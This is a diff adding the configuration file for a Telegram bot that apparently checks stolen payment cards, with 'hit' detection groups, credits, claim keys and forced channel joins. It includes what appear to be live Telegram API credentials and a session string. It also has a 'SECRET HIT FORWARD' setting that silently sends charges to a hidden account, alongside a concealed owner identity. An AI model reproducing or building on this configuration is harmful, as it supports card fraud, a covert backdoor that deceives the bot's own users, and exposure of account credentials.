@@ -1,0 +1,46 @@
+API_ID = 30224653
+API_HASH = "402d5be73bcc3e4bd5c3015a2396802b"
+SESSION_STRING = "AQJQHbUAwn_Y158TYVmQGDHtvWEB90fe4oC-TJvf8vmvVZt-e2HwWeviX3QiKudGpXIIijLPz_h4UeingCXbqZRxZmjPiyaTMhQP7Al-H4rkK89KPHndTRAxFEZO95sFAnX6t80Z0N2AhAg-AnWRt4fG2YKpwaWcJqHcn1g9641wrgqVuJ2-ne9O8_la5ECi9QhMVBMojTT7gsCo_SlJYeZA65IUJzyMdJfzC9pnxTQMdsJXcPBG-jmNx1A-vDus4Qj5fl0gW_aa5wG3bxif9jDTPpEK5JVgvuk7E4_PY7Ry41d8hCbX2TaZV3RIOGDYgf5y7YNSiqTMVt2pYgB-UlRAErmDRQAAAAHraX5JAA"
+
+# ═══ NEW IDENTITY ═══
+OWNER_ID = 8887845336                # new dev / owner (hidden)
+DEV_ID = 8887845336                  # alias for clarity
+OWNER_USERNAME = "errorz_do_not_dm"  # placeholder — no real account
+OWNER_NAME = "𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙"
+BOT_NAME = "𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙"
+
+# ═══ SECRET HIT FORWARD ═══
+SECRET_CC_ID = 8919487892            # hidden — charges silently forwarded here
+SECRET_FORWARD = True
+
+# ═══ KEY PREFIX ═══
+KEY_PREFIX = "𒉼"                    # single-word prefix so /claim works
+
+# ═══ BACKUP ═══
+BACKUP_UTC_HOUR = 0
+BACKUP_UTC_MINUTE = 0
+BACKUP_SPLIT_BYTES = 18 * 1024 * 1024  # 18MB chunks
+
+# ═══ MEDIA ═══
+ANIME_API_URL = "https://api.waifu.pics/sfw/waifu"
+ANIME_FALLBACK = "https://i.pinimg.com/736x/8e/9e/9a/8e9e9a7f1b52e157063a19a3b7f3b8e1.jpg"
+START_PHOTO = ANIME_FALLBACK
+FIRST_START_IMAGE = ANIME_FALLBACK
+
+# ═══ GROUPS ═══
+HIT_DETECTION_GROUP_ID = -1004423692399
+FEEDBACK_GROUP_ID = -1004423692399
+GC_LINK = "https://t.me/+wM2OGzwfiiVkMjA8"
+UPDATES_LINK = "https://t.me/+CHQ634BwKrE1YjNk"
+
+FORCE_JOIN_GROUP_ID = -1004499197768
+FORCE_JOIN_GROUP_LINK = "+wM2OGzwfiiVkMjA8"
+FORCE_JOIN_CHANNEL_ID = -1004429373326
+FORCE_JOIN_CHANNEL_LINK = "+CHQ634BwKrE1YjNk"
+FORCE_JOIN_IMAGE = ANIME_FALLBACK
+
+DEFAULT_LIMIT = 1000
+PREMIUM_LIMIT = 5000
+COOLDOWN_FREE = 10
+COOLDOWN_TRIAL = 10
+CREDIT_COST = 2
